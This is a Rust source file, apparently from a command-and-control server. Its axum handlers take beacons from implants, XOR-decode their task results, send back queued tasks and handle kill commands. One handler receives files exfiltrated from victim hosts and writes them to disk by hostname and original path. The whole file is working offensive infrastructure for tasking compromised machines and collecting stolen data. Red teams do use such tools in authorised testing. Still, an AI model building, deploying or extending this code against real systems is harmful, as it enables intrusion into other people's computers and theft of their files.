use std::sync::Arc;

use crate::{
    EXFIL_PATH,
    agents::{extract_agent_id, handle_kill_command},
    app_state::AppState,
    exfil::handle_exfiltrated_file,
    logging::log_error_async,
    net::serialise_tasks_for_agent,
};
use axum::{
    Json,
    body::Body,
    extract::{FromRequest, Multipart, Path, Request, State},
    http::{HeaderMap, StatusCode, header::CONTENT_TYPE},
    response::IntoResponse,
};
use futures::{StreamExt, TryStreamExt};
use shared::{
    net::{XorEncode, decode_http_response},
    tasks::{Command, FirstRunData},
};
use tokio::io::AsyncWriteExt;

pub async fn agent_post_handler_with_path(
    state: State<Arc<AppState>>,
    headers: HeaderMap,
    Path(endpoint): Path<String>,
    req: Request<Body>,
) -> impl IntoResponse {
    let state_arc = Arc::clone(&state);

    {
        let lock = state_arc.endpoints.read().await;
        if lock.c2_endpoints.contains(&endpoint) {
            drop(lock);
            if is_multipart(req.headers()) {
                match Multipart::from_request(req, &state).await {
                    Ok(mp) => return receive_exfil(mp).await.into_response(),
                    Err(_) => return StatusCode::BAD_REQUEST.into_response(),
                }
            }

            let json = match Json::<Vec<Vec<u8>>>::from_request(req, &state).await {
                Ok(payload) => payload,
                Err(_) => return StatusCode::BAD_REQUEST.into_response(),
            };

            return handle_agent_post_standard(state, headers, json)
                .await
                .into_response();
        }
    }

    // endpoint not found / valid
    StatusCode::BAD_GATEWAY.into_response()
}

pub async fn agent_post_handler(
    state: State<Arc<AppState>>,
    headers: HeaderMap,
    req: Request<Body>,
) -> impl IntoResponse {
    if is_multipart(req.headers()) {
        match Multipart::from_request(req, &state).await {
            Ok(mp) => return receive_exfil(mp).await.into_response(),
            Err(_) => return StatusCode::BAD_REQUEST.into_response(),
        }
    }

    let json = match Json::<Vec<Vec<u8>>>::from_request(req, &state).await {
        Ok(payload) => payload,
        Err(_) => return StatusCode::BAD_REQUEST.into_response(),
    };

    handle_agent_post_standard(state, headers, json)
        .await
        .into_response()
}

async fn handle_agent_post_standard(
    state: State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<Vec<Vec<u8>>>,
) -> Vec<u8> {
    let cl = state.clone();

    // We check the payload length later in an assert to make sure there is no incorrect state going on.
    let payload_len = payload.len();

    for item in payload {
        let decoded = item.xor_network_stream();

        let mut task = decode_http_response(&decoded);

        //
        // First we check here whether the agent is connecting for the FIRST time since it was exited.
        // For example, from a reboot, or from killing the process.
        // This does not mean, first time ever seen like full stop, that doesn't matter.
        //
        // We split the separation because we don't want to start making things completed as below with
        // `mark_task_completed`, or adding to the completed pool, as this task will never exist in the database.
        // It serves only the implant itself.
        //
        // NOTE: This branch will RETURN from the processing of the beacons tasks; in theory there should ONLY
        // ever be this one `Command` sent up to the C2 on first connect, so it should be fine - I cannot see
        // any circumstance where other tasks will be pending processing along-with this command, unless we mess
        // up and accidentally write this task somewhere we shouldn't. If that happens, hopefully this comment
        // will help debug :).
        //
        if task.command == Command::AgentsFirstSessionBeacon {
            // Validate the state that there is only 1 task.
            // The invalid state will brick implants, so forces the bug to be reviewed if it appears.
            // But.. this should never appear.
            assert!(payload_len == 1);

            let first_run_data: FirstRunData = match serde_json::from_str(&task.metadata.unwrap()) {
                Ok(d) => d,
                Err(e) => panic!("Failed to deserialise first run data from string. {e}"),
            };

            // Serialise the tasks and send them back
            let (agent, tasks) = state
                .connected_agents
                .get_agent_and_tasks_by_header(&headers, &cl.db_pool, Some(first_run_data))
                .await;

            let mut init_tasks = agent.get_config_data();
            if let Some(mut tasks) = tasks {
                init_tasks.append(&mut tasks);
            }

            return serialise_tasks_for_agent(Some(init_tasks)).await;
        }

        // Handle file exfil - save to disk and remove the exfil bytes, we dont want to store those
        // in the database if we are saving the file to disk.
        if task.command == Command::Pull {
            handle_exfiltrated_file(&mut task).await;
        }

        // If we have console messages, we need to explicitly put these in as a new task; although it isn't
        // a task strictly speaking, not doing so breaks the current model
        if task.command == Command::ConsoleMessages {
            let uid = extract_agent_id(&headers);
            let id = state
                .db_pool
                .add_task_for_agent_by_id(&uid, Command::ConsoleMessages, None)
                .await
                .expect("Could not insert new task for incoming Console Messages");

            // Overwrite the task ID from 1 to the new one
            task.id = id;
        }

        //
        // Command::AgentsFirstSessionBeacon was not present, so continue to
        //

        if let Err(e) = state.db_pool.mark_task_completed(&task).await {
            {
                log_error_async(&format!(
                    "Failed to complete task in db where task ID = {}. {e}",
                    task.id
                ))
                .await;
            }
        }

        // Get a copy of the agent
        let agent_id = extract_agent_id(&headers);
        if let Err(e) = state.db_pool.add_completed_task(&task, &agent_id).await {
            log_error_async(&format!(
                "Failed to add task results to completed table where task ID = {}. {e}",
                task.id
            ))
            .await
        }
    }

    //
    // Get any additional tasks from the database.
    //
    let (agent, tasks) = state
        .connected_agents
        .get_agent_and_tasks_by_header(&headers, &cl.db_pool, None)
        .await;

    //
    // Check whether the kill command is present and the agent needs removing from the live list..
    //
    handle_kill_command(state.connected_agents.clone(), &agent, &tasks).await;

    //
    // Serialise the response and return it
    //
    serialise_tasks_for_agent(tasks).await
}

async fn receive_exfil(mut mp: Multipart) -> Result<StatusCode, StatusCode> {
    let mut hostname: Option<String> = None;
    let mut source_path: Option<String> = None;

    while let Some(mut field) = mp.next_field().await.map_err(|_| StatusCode::BAD_REQUEST)? {
        match field.name() {
            Some("hostname") => {
                hostname = Some(field.text().await.map_err(|_| StatusCode::BAD_REQUEST)?)
            }
            Some("source_path") => {
                source_path = Some(field.text().await.map_err(|_| StatusCode::BAD_REQUEST)?)
            }
            Some("file") => {
                let host = hostname.as_deref().ok_or(StatusCode::BAD_REQUEST)?;
                let path = source_path.as_deref().ok_or(StatusCode::BAD_REQUEST)?;

                let mut dest = format!("{EXFIL_PATH}/{host}/{path}");
                dest = dest.replace(r"C:\", "").replace('\\', "/");
                if let Some(parent) = std::path::Path::new(&dest).parent() {
                    tokio::fs::create_dir_all(parent)
                        .await
                        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
                }

                let mut out = tokio::fs::File::create(&dest)
                    .await
                    .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

                let mut stream = field.into_stream();
                while let Some(chunk) = stream.next().await {
                    out.write_all(&chunk.map_err(|_| StatusCode::BAD_REQUEST)?)
                        .await
                        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
                }
            }
            _ => {}
        }
    }

    Ok(StatusCode::OK)
}

fn is_multipart(headers: &HeaderMap) -> bool {
    headers
        .get(CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .map(|v| v.starts_with("multipart/"))
        .unwrap_or(false)
}
